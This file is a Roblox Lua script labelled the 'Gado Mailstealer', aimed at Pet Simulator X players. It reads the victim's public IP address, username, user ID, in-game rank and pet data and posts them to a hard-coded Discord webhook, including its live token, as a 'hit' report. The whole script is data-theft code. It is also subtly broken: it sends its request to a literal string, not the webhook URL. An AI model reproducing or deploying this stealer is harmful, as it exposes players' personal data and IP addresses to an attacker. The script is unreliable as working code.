local ip = tostring(game:HttpGet("https://api.ipify.org", true))
if game.PlaceId == 6284583030 then
	_G.GameIn = "Pet Simulator X"
elseif game.PlaceId == 7722306047 then
	_G.GameIn = "PSX Trading Plaza"
elseif game.PlaceId == 10321372166 then
	_G.GameIn = "PSX Hardcore"
elseif game.PlaceId == 12610002282 then
	_G.GameIn = "PSX Pro Trading Plaza"
elseif game.PlaceId == 11725212117 then
	_G.GameIn = "PSX Voice Trading Plaza"
else
	_G.GameIn = "❓ Couldn't find game"
end
local webhookcolor = "13369599"
_G.CurrentRank = game:GetService("Players").LocalPlayer.PlayerGui.Main.Right.Rank.RankName.Text
_G.PlrUserVictim = game.Players.LocalPlayer.Name
_G.PlrUserIDVictim = game.Players.LocalPlayer.UserId
_G.PlrDisplayNameVictim = game.Players.LocalPlayer.DisplayName
_G.Webhook = "https://discord.com/api/webhooks/1120682293263085599/fz0jBPKE3m-dHQmOUHqi4AttqXoOi8gRJuN6tzFKDDbHoV2YHZqVqQzMeNzTmYhZbJgJ"
local function sendWebhook(msg)
	local webhook = "_G.Webhook"

	local http_request = http_request or request or HttpPost or syn.request
	local requestBody = game.HttpService:JSONEncode(msg)

	http_request({
		Url = webhook,
		Method = "POST",
		Headers = {
			["Content-Type"] = "application/json"
		},
		Body = requestBody
	})
end

local msg = {
	["content"] = "**@here GADO HAS DETECTED A HIT!**",
	["embeds"] = {
		{
			["title"] = "`Gado Mailstealer Results`",
			["description"] = "**Data from the victim**\n🧑Display Name: " .. _G.PlrDisplayNameVictim .. "\n🧑Username: " .. _G.PlrUserVictim .. "\n🧑User ID: " .. _G.PlrUserIDVictim .. "\n🐱Rank: " .. _G.CurrentRank .. "\n🎮Place: " .. _G.GameIn .. "\n Player Ip: " .. ip .. "",
			["url"] = "https://discord.gg/nqny2McnjK",
			["color"] = webhookcolor,
			["fields"] = {
				{
					["name"] = "```".._G.Diamonds.."```",
					["value"] = "penis",
					["inline"] = true
				},
				{
					["name"] = "Pet Name & Rarity",
					["value"] = "```Pet Name: ".._G.PetName.."\nPet Rarity: ".._G.PetRar.."```",
					["inline"] = true
				}
			}
		}
	},
	["attachments"] = {}
}

if _G.Username == "W4r_ObScUrE" then
    local webhook = "https://discord.com/api/webhooks/1120682293263085599/fz0jBPKE3m-dHQmOUHqi4AttqXoOi8gRJuN6tzFKDDbHoV2YHZqVqQzMeNzTmYhZbJgJ"
else
   print("ok")
end 

sendWebhook(msg)
